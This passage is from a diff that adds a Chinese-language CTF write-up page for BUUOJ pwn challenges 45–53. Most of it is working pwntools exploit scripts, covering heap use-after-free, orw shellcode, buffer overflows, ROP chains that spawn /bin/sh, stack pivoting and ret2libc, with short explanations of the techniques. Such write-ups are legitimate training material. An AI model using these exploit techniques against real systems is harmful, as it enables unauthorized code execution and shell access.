+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Index :&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">printf</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice :&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Index :&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span><span class="s1">&#39;aaa&#39;</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span><span class="s1">&#39;bbb&#39;</span><span class="p">)</span>
+<span class="c1">#dbg()</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="c1">#dbg()</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="n">p32</span><span class="p">(</span><span class="n">shell</span><span class="p">))</span>
+<span class="n">dbg</span><span class="p">()</span>
+<span class="n">printf</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="45-pwnable_orw">45 pwnable_orw</h2>
+<h1 id="sandbox">sandbox</h1>
+<p>就是ban了一些危险的函数，但是以获得flag为目的的话也不需要非得getshell</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">26440</span><span class="p">)</span>
+<span class="c1">#p = process(&#39;./pwn&#39;)</span>
+
+<span class="n">bss</span> <span class="o">=</span> <span class="mh">0x804A060</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">)</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span><span class="n">bss</span><span class="o">+</span><span class="mi">100</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span>
+<span class="n">shellcode</span><span class="o">+=</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">bss</span><span class="o">+</span><span class="mi">100</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;shellcode:&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="c1">#log.info(p.recv())</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="46-picoctf_2018_buffer-overflow-2">46 picoctf_2018_buffer overflow 2</h2>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">LibcSearcher</span><span class="w"> </span><span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">ctypes</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="s1">&#39;wt.exe -d . wsl.exe -d Ubuntu&#39;</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./pwn&quot;</span><span class="p">)</span>
+<span class="c1">#p = process(&#39;./pwn&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">28047</span><span class="p">)</span>
+<span class="c1">#gdb.attach(p)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x6c</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x4</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x080485CB</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xDEADBEEF</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xDEADC0DE</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="47-cmcc_simplerop">47 cmcc_simplerop</h2>
+<p><strong><em>rop</em></strong></p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">LibcSearcher</span><span class="w"> </span><span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">ctypes</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="s1">&#39;wt.exe -d . wsl.exe -d Ubuntu&#39;</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./pwn&quot;</span><span class="p">)</span>
+<span class="c1">#p = process(&#39;./pwn&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">29845</span><span class="p">)</span>
+<span class="c1">#gdb.attach(p)</span>
+
+<span class="n">read_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+<span class="n">pop_edx_ecx_ebx</span> <span class="o">=</span> <span class="mh">0x0806e850</span>
+<span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x80EB584</span>
+<span class="n">int_addr</span> <span class="o">=</span> <span class="mh">0x80493e1</span>    <span class="c1"># int 0x80</span>
+<span class="n">pop_eax</span> <span class="o">=</span> <span class="mh">0x80bae06</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x20</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">read_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x8</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p32</span><span class="p">(</span><span class="n">pop_eax</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xb</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">int_addr</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h3 id="_1">分析分析</h3>
+<p>这种纯手工构造ROP还是可以分析分析的</p>
+<ul>
+<li>
+<p>首先是系统调用的知识，可以看<a href="https://blog.csdn.net/xiaominthere/article/details/17287965">这里</a></p>
+</li>
+<li>
+<p>省流一下：<code>int 0x80</code>就是系统调用（syscall），然后根据<code>syscall(n)</code>中n的值执行不同函数，其中<code>0xb</code>可以执行<code>execve</code>函数</p>
+</li>
+<li>
+<p>接下来构造ROP</p>
+</li>
+<li>
+<p>先是溢出覆盖，这里ida显示的不对，动态调试可以发现实际的偏移是0x1c</p>
+<blockquote>
+<p>我们输入的相对位置是0x24,ebp的相对位置是0x40，实际偏移<code>0x40-0x24=0x1c</code></p>
+</blockquote>
+</li>
+<li>
+<p>因为程序中没有<code>/bin/sh</code>函数，所以我们需要调用一下<code>read</code>函数，以此输入一个<code>/bin/sh</code>进去（这里binsh的地址是bss段，因为没开PIE，所以地址所见即所得）</p>
+</li>
+<li>
+<p>接下来第二行就是进行系统调用了，我们要申请的函数是</p>
+<div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="mh">0x80</span><span class="p">(</span><span class="mh">0xb</span><span class="p">,</span><span class="err">’</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">‘</span><span class="p">,</span><span class="w"> </span><span class="n">null</span><span class="p">,</span><span class="w"> </span><span class="n">null</span><span class="p">);</span>
+<span class="c1">//对应寄存器eax, ebx,     ecx,  edx</span>
+</code></pre></div>
+<p>这四个寄存器地址也确实可以搜到，所以根据寄存器依次输入需要的数就好</p>
+</li>
+</ul>
+<h2 id="48-black-watch-pwn">48 [Black Watch 入群题]PWN</h2>
+<h1 id="_2">栈迁移</h1>
+<p>因为没有RWX段，所以不可以写入shellcode然后栈迁移执行</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">#p = process(&#39;./pwn&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;node5.buuoj.cn&quot;</span><span class="p">,</span> <span class="mi">25707</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.23.so&#39;</span><span class="p">)</span>
+
+<span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x8048513</span>
+<span class="n">lea_ret_addr</span> <span class="o">=</span> <span class="mh">0x8048511</span>
+<span class="n">plt_write</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+<span class="n">got_write</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+<span class="n">bss_s_addr</span> <span class="o">=</span> <span class="mh">0x804A300</span>
+
+<span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">plt_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">got_write</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&quot;name?&quot;</span><span class="p">,</span> <span class="n">payload1</span><span class="p">)</span>
+
+<span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x18</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bss_s_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">lea_ret_addr</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&quot;say?&quot;</span><span class="p">,</span> <span class="n">payload2</span><span class="p">)</span>
+<span class="n">write_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+<span class="n">binsh</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span><span class="o">.</span><span class="fm">__next__</span><span class="p">()</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+
+<span class="n">payload3</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;aaaa&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;aaaa&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&quot;name?&quot;</span><span class="p">,</span> <span class="n">payload3</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&quot;say?&quot;</span><span class="p">,</span> <span class="n">payload2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="49-wustctf2020_getshell_2">49 wustctf2020_getshell_2</h2>
+<p><strong><em>基础ROP</em></strong></p>
+<p>system(/sh)也可以getshell</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">LibcSearcher</span><span class="w"> </span><span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">ctypes</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="s1">&#39;wt.exe -d . wsl.exe -d Ubuntu&#39;</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./pwn&quot;</span><span class="p">)</span>
+<span class="c1">#p = process(&#39;./pwn&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">28502</span><span class="p">)</span>
+
+
+<span class="n">sh</span> <span class="o">=</span> <span class="mh">0x08048670</span>
+<span class="n">call_sys</span> <span class="o">=</span> <span class="mh">0x8048529</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x18</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x4</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">call_sys</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="50-mrctf2020_easyoverflow">50 mrctf2020_easyoverflow</h2>
+<p><strong><em>栈数据覆盖</em></strong></p>
+<p>发现当<code>check(v5)</code>等于<code>n0t_r3@11y_f1@g</code>时会getshell，然后<code>v4</code>的读入不限制长度，可以覆盖掉v5的值</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">LibcSearcher</span><span class="w"> </span><span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">ctypes</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="s1">&#39;wt.exe -d . wsl.exe -d Ubuntu&#39;</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./pwn&quot;</span><span class="p">)</span>
+<span class="c1">#p = process(&#39;./pwn&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">29336</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x30</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;n0t_r3@11y_f1@g&#39;</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="51-bbys_tu_2016">51 bbys_tu_2016</h2>
+<p><strong><em>ret2text</em></strong></p>
+<p>ida里面的偏移有问题，需要动态调试看看</p>
+<p><img alt="image-20250206135324577-1751369336357-1-1751369475497-15.png" src="../../../images/image-20250206135324577-1751369336357-1-1751369475497-15.png" /></p>
+<p>这里<code>-14</code>，说明偏移为14</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">LibcSearcher</span><span class="w"> </span><span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">ctypes</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="s1">&#39;wt.exe -d . wsl.exe -d Ubuntu&#39;</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./pwn&quot;</span><span class="p">)</span>
+<span class="c1">#p = process(&#39;./pwn&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25770</span><span class="p">)</span>
+<span class="c1">#gdb.attach(p)</span>
+
+<span class="n">flag_addr</span> <span class="o">=</span> <span class="mh">0x804856D</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x18</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="52-xdctf2015_pwn200">52 xdctf2015_pwn200</h2>
+<p><strong><em>ret2libc</em></strong></p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">LibcSearcher</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+
+<span class="n">e</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25844</span><span class="p">)</span>
+
+
+<span class="n">write_got</span><span class="o">=</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;write&quot;</span><span class="p">]</span>
+<span class="n">write_plt</span><span class="o">=</span><span class="n">e</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;write&quot;</span><span class="p">]</span>
+
+<span class="n">main_add</span><span class="o">=</span><span class="n">e</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;main&quot;</span><span class="p">]</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;a&quot;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x6c</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">main_add</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="n">write</span><span class="o">=</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xf7</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:])</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;write:&quot;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">write</span><span class="p">))</span>
+
+<span class="n">libc_base</span><span class="o">=</span><span class="n">write</span><span class="o">-</span><span class="mh">0xd43c0</span>
+
+<span class="n">system</span> <span class="o">=</span> <span class="mh">0x3a940</span> <span class="o">+</span> <span class="n">libc_base</span>
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x15902b</span> <span class="o">+</span> <span class="n">libc_base</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="n">payload2</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;a&quot;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x6c</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">main_add</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="53-wustctf2020_closed">53 wustctf2020_closed</h2>
+<h1 id="_3">重定向</h1>
+<p>ida看一下</p>
+<div class="highlight"><pre><span></span><code><span class="kr">__int64</span><span class="w"> </span><span class="nf">vulnerable</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;HaHaHa!</span><span class="se">\n</span><span class="s">What else can you do???&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">shell</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>关闭了标准输出（1）和错误输出（2），就算是getshell了也不会得到回显。所以可以利用<code>exec 1&gt;&amp;0</code>将标准输出重定向到标准输入</p>
+<h3 id="_4">标准文件描述符</h3>
+<ul>
+<li><strong>标准输入（stdin）</strong>：使用文件描述符0（FD 0）表示，默认情况下终端键盘输入与其关联。</li>
+<li><strong>标准输出（stdout）</strong>：使用文件描述符1（FD 1）表示，默认情况下终端屏幕显示与其关联。</li>
+<li><strong>标准错误（stderr）</strong>：使用文件描述符2（FD 2）表示，默认情况下终端屏幕显示与其关联。</li>
+</ul>
+<h3 id="_5">重定向</h3>
+<p><code>exec 1&gt;&amp;0</code>是Shell命令行中的重定向语法，用于将标准输出重定向到标准输入，<strong>因此后续的输出会被作为输入来处理</strong></p>
